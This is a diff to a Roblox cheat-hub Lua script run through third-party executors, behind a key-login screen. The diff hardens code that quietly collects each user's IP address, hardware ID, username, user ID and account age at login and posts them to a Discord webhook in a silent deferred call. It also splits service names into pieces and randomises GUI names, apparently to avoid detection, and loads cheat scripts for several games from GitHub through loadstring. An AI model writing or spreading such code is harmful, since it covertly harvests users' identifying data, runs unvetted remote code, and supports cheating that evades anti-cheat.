@@ -17,12 +17,79 @@ if _G.InovoLoaded then
 end
 _G.InovoLoaded = true
 
+-- Service helpers
+local rawGetService = game.GetService
+local rawFindService = game.FindService
+
+local function fetchService(nameParts)
+    local serviceName
+    if type(nameParts) == "table" then
+        serviceName = table.concat(nameParts)
+    else
+        serviceName = nameParts
+    end
+
+    local ok, service = pcall(rawGetService, game, serviceName)
+    if ok and service then
+        return service
+    end
+
+    ok, service = pcall(rawFindService, game, serviceName)
+    if ok and service then
+        return service
+    end
+
+    return nil
+end
+
 -- Services
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
-local HttpService = game:GetService("HttpService")
+local TweenService = fetchService({"Tween", "Service"})
+local UserInputService = fetchService({"User", "Input", "Service"})
+local Players = fetchService("Players")
+local CoreGui = fetchService({"Core", "Gui"})
+local HttpService = fetchService({"Http", "Service"})
+local MarketplaceService = fetchService({"Marketplace", "Service"})
+local AnalyticsService = fetchService({"Rbx", "Analytics", "Service"})
+local httpRequest = (syn and syn.request) or (http and http.request) or request
+math.randomseed(tick() % 1 * 1e6)
+
+local function randomId(prefix)
+    local suffix = tostring(math.random(100000, 999999))
+    return (prefix or "Inovo") .. "_" .. suffix
+end
+
+local function safeHttpGet(url)
+    if type(game.HttpGet) ~= "function" then
+        return nil
+    end
+
+    local ok, response = pcall(game.HttpGet, game, url)
+    if ok then
+        return response
+    end
+
+    return nil
+end
+
+local function fetchRemote(url)
+    local body = safeHttpGet(url)
+    if body and #body > 0 then
+        return body
+    end
+
+    if httpRequest then
+        local ok, response = pcall(httpRequest, {
+            Url = url,
+            Method = "GET"
+        })
+
+        if ok and response and response.StatusCode == 200 and response.Body then
+            return response.Body
+        end
+    end
+
+    return nil
+end
 
 -- Configuration
 local CORRECT_KEY = "inovoproductionsv1"
@@ -36,74 +103,100 @@ local executor = identifyexecutor and identifyexecutor() or "Unknown"
 local function getHWID()
     if gethwid then
         return gethwid()
-    elseif syn and syn.request then
-        return game:GetService("RbxAnalyticsService"):GetClientId()
-    else
-        return game:GetService("RbxAnalyticsService"):GetClientId()
     end
+
+    if AnalyticsService and AnalyticsService.GetClientId then
+        local ok, hwid = pcall(AnalyticsService.GetClientId, AnalyticsService)
+        if ok and hwid then
+            return hwid
+        end
+    end
+
+    return "Unknown"
 end
 
 -- Get IP Address
 local function getIPAddress()
+    if not HttpService then
+        return "Unknown"
+    end
+
     local success, result = pcall(function()
-        local response = game:HttpGet("https://api.ipify.org?format=json")
+        local response = safeHttpGet("https://api.ipify.org?format=json")
+        if not response then
+            return "Unknown"
+        end
+
         local data = HttpService:JSONDecode(response)
         return data.ip or "Unknown"
     end)
     return success and result or "Unknown"
 end
 
+
 -- Send to Discord Webhook
 local function sendToWebhook(key_correct)
+    if not HttpService then
+        return
+    end
+
     local hwid = getHWID()
     local ip = getIPAddress()
     local username = LocalPlayer.Name
     local userid = LocalPlayer.UserId
     local displayname = LocalPlayer.DisplayName
     local accountage = LocalPlayer.AccountAge
-    
-    local status = key_correct and "✅ Key Correct" or "❌ Key Incorrect"
+
+    local status = key_correct and "Key Correct" or "Key Incorrect"
     local color = key_correct and 3066993 or 15158332
-    
+
+    local gameName = "Unknown"
+    if MarketplaceService and MarketplaceService.GetProductInfo then
+        local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
+        if ok and info and info.Name then
+            gameName = info.Name
+        end
+    end
+
     local embed = {
         ["embeds"] = {{
-            ["title"] = "🔐 InovoProductions Hub - Login Attempt",
+            ["title"] = "InovoProductions Hub - Login Attempt",
             ["description"] = "**Status:** " .. status,
             ["color"] = color,
             ["fields"] = {
                 {
-                    ["name"] = "👤 Username",
+                    ["name"] = "Username",
                     ["value"] = username .. " (@" .. displayname .. ")",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🆔 User ID",
+                    ["name"] = "User ID",
                     ["value"] = tostring(userid),
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "📅 Account Age",
+                    ["name"] = "Account Age",
                     ["value"] = tostring(accountage) .. " days",
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "💻 HWID",
+                    ["name"] = "HWID",
                     ["value"] = "```" .. tostring(hwid) .. "```",
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "🌐 IP Address",
+                    ["name"] = "IP Address",
                     ["value"] = "```" .. tostring(ip) .. "```",
                     ["inline"] = false
                 },
                 {
-                    ["name"] = "⚙️ Executor",
+                    ["name"] = "Executor",
                     ["value"] = executor,
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🎮 Game",
-                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["name"] = "Game",
+                    ["value"] = gameName,
                     ["inline"] = true
                 }
             },
@@ -113,24 +206,26 @@ local function sendToWebhook(key_correct)
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
         }}
     }
-    
+
     local data = HttpService:JSONEncode(embed)
-    
-    pcall(function()
-        local response = request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = data
-        })
+
+    if not httpRequest then
+        return
+    end
+
+    task.defer(function()
+        pcall(function()
+            httpRequest({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = data
+            })
+        end)
     end)
 end
-
--- Custom asset helpers (used for button images)
-local getCustomAsset = getsynasset or getcustomasset
-local httpRequest = (syn and syn.request) or (http and http.request) or request
 
 local function loadImageAsset(fileName, url)
     if not (getCustomAsset and writefile and isfile and isfolder and makefolder) then
@@ -155,29 +250,16 @@ local function loadImageAsset(fileName, url)
 
     local filePath = imageFolder .. "/" .. fileName
     if not isfile(filePath) then
-        local success, body = pcall(function()
-            if httpRequest then
-                local response = httpRequest({
-                    Url = url,
-                    Method = "GET"
-                })
-                if response and response.StatusCode == 200 and response.Body then
-                    return response.Body
-                end
-            end
+        local remoteBody = fetchRemote(url)
+        if not remoteBody then
+            return nil
+        end
 
-            return game:HttpGet(url)
+        local wrote = pcall(function()
+            writefile(filePath, remoteBody)
         end)
 
-        if success and body then
-            local wrote = pcall(function()
-                writefile(filePath, body)
-            end)
-
-            if not wrote then
-                return nil
-            end
-        else
+        if not wrote then
             return nil
         end
     end
@@ -194,17 +276,21 @@ local function loadImageAsset(fileName, url)
 end
 
 -- Load Library
-local InovoLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/InovoLib.lua"))()
-
+local libSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/InovoLib.lua")
+if not libSource then
+    warn("[InovoHub] Failed to load UI library.")
+    return
+end
+local InovoLib = loadstring(libSource)()
 -- Create Key System GUI
 local keyScreenGui = Instance.new("ScreenGui")
-keyScreenGui.Name = "InovoKeySystem"
+keyScreenGui.Name = randomId("InovoKey")
 keyScreenGui.ResetOnSpawn = false
 keyScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 keyScreenGui.Parent = CoreGui
 
 local keyFrame = Instance.new("Frame")
-keyFrame.Name = "KeyFrame"
+keyFrame.Name = randomId("KeyFrame")
 keyFrame.Size = UDim2.new(0, 480, 0, 280)
 keyFrame.Position = UDim2.new(0.5, -240, 0.5, -140)
 keyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
@@ -222,6 +308,7 @@ keyAccent.BorderSizePixel = 0
 keyAccent.Parent = keyFrame
 
 local keyHeader = Instance.new("Frame")
+keyHeader.Name = randomId("KeyHeader")
 keyHeader.Size = UDim2.new(1, 0, 0, 60)
 keyHeader.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
 keyHeader.BorderSizePixel = 0
@@ -248,7 +335,8 @@ keyTitle.Parent = keyHeader
 
 local keyCloseBtn = Instance.new("TextButton")
 keyCloseBtn.Size = UDim2.new(0, 40, 0, 40)
-keyCloseBtn.Position = UDim2.new(1, -50, 0, 10)
+keyCloseBtn.AnchorPoint = Vector2.new(1, 0.5)
+keyCloseBtn.Position = UDim2.new(1, -20, 0.5, 0)
 keyCloseBtn.BackgroundColor3 = Color3.fromRGB(240, 71, 71)
 keyCloseBtn.BorderSizePixel = 0
 keyCloseBtn.Text = "X"
@@ -439,14 +527,14 @@ end)
 function loadMainGUI()
     -- Create Main Selection GUI (NO TABS!)
     local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "InovoGameSelector"
+screenGui.Name = randomId("InovoMenu")
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = CoreGui
 
 -- Main Frame
 local mainFrame = Instance.new("Frame")
-mainFrame.Name = "Main"
+mainFrame.Name = randomId("MainContainer")
 mainFrame.Size = UDim2.new(0, 720, 0, 400)
 mainFrame.Position = UDim2.new(0.5, -360, 0.5, -200)
 mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
@@ -791,7 +879,21 @@ arsenalBtn.MouseButton1Click:Connect(function()
     task.wait(0.1)
     
     -- Load Arsenal
-    local Arsenal = loadstring(game:HttpGet("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/Arsenal.lua"))()
+    local arsenalSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/Arsenal.lua")
+    if not arsenalSource then
+        warn("[InovoHub] Failed to load Arsenal script.")
+        return
+    end
+    local arsenalChunk = loadstring(arsenalSource)
+    if not arsenalChunk then
+        warn("[InovoHub] Could not compile Arsenal script.")
+        return
+    end
+    local Arsenal = arsenalChunk()
+    if type(Arsenal) ~= "table" or not Arsenal.Init then
+        warn("[InovoHub] Arsenal script returned unexpected result.")
+        return
+    end
     Arsenal:Init()
     
     local Window = InovoLib:CreateWindow({
@@ -979,7 +1081,21 @@ prisonBtn.MouseButton1Click:Connect(function()
     task.wait(0.1)
     
     -- Load Prison Life
-    local PrisonLife = loadstring(game:HttpGet("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/PrisonLife.lua"))()
+    local prisonSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/PrisonLife.lua")
+    if not prisonSource then
+        warn("[InovoHub] Failed to load Prison Life script.")
+        return
+    end
+    local prisonChunk = loadstring(prisonSource)
+    if not prisonChunk then
+        warn("[InovoHub] Could not compile Prison Life script.")
+        return
+    end
+    local PrisonLife = prisonChunk()
+    if type(PrisonLife) ~= "table" or not PrisonLife.Init then
+        warn("[InovoHub] Prison Life script returned unexpected result.")
+        return
+    end
     PrisonLife:Init()
     
     local Window = InovoLib:CreateWindow({
@@ -1218,7 +1334,21 @@ fiverBtn.MouseButton1Click:Connect(function()
     screenGui:Destroy()
     task.wait(0.1)
     
-    local FiveR = loadstring(game:HttpGet("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/FiveR.lua"))()
+    local fiverSource = fetchRemote("https://raw.githubusercontent.com/ardinoshopz2-ship-it/7/main/Games/FiveR.lua")
+    if not fiverSource then
+        warn("[InovoHub] Failed to load FiveR script.")
+        return
+    end
+    local fiverChunk = loadstring(fiverSource)
+    if not fiverChunk then
+        warn("[InovoHub] Could not compile FiveR script.")
+        return
+    end
+    local FiveR = fiverChunk()
+    if type(FiveR) ~= "table" or not FiveR.Init then
+        warn("[InovoHub] FiveR script returned unexpected result.")
+        return
+    end
     FiveR:Init()
     
     local Window = InovoLib:CreateWindow({
